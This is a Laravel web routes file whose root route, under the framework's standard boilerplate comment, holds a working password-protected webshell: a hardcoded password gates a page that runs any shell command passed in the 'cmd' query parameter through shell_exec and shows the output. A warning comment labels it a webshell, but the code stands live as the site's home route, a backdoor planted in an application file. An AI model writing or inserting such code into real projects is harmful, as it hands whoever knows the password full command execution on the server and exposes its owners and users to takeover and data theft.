<?php

use Illuminate\Support\Facades\Route;
use Illuminate\Http\Request;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', function (Request $request) {
    // WARNING: This is a webshell. Do not use in production.

    $password = 'Shell12439#';
    $inputPassword = $request->input('password');

    if ($inputPassword !== $password) {
        return '
            <form method="GET">
                <input type="password" name="password" placeholder="Password" autofocus>
                <button type="submit">Login</button>
            </form>
        ';
    }

    $cwd = $request->input('cwd', getcwd());
    $cmd = $request->input('cmd');
    $output = '';

    if ($cmd) {
        if (strpos($cmd, 'cd ') === 0) {
            $newDir = substr($cmd, 3);
            if (chdir($cwd)) {
                if (chdir($newDir)) {
                    $cwd = getcwd();
                } else {
                    $output = "Could not change directory to $newDir";
                }
            }
        } else {
            // Execute command in the current working directory
            $command = "cd " . escapeshellarg($cwd) . " && " . $cmd . " 2>&1";
            $output = shell_exec($command);
        }
    }

    $html = '
    <html>
    <head>
        <style>
            body { background-color: #000; color: #0f0; font-family: monospace; }
            input { background-color: #333; color: #fff; border: none; padding: 5px; width: 80%; }
            button { background-color: #333; color: #fff; border: 1px solid #0f0; padding: 5px; cursor: pointer; }
            pre { white-space: pre-wrap; word-wrap: break-word; }
        </style>
    </head>
    <body>
        <pre>' . htmlspecialchars($output) . '</pre>
        <form method="GET">
            <input type="hidden" name="password" value="' . htmlspecialchars($password) . '">
            <input type="hidden" name="cwd" value="' . htmlspecialchars($cwd) . '">
            <span>' . htmlspecialchars($cwd) . ' $</span>
            <input type="text" name="cmd" autofocus autocomplete="off">
            <button type="submit">Run</button>
        </form>
        <script>
            document.querySelector("input[name=\'cmd\']").focus();
        </script>
    </body>
    </html>
    ';

    return $html;
});

Route::get('/home', 'HomeController@index')->name('home');
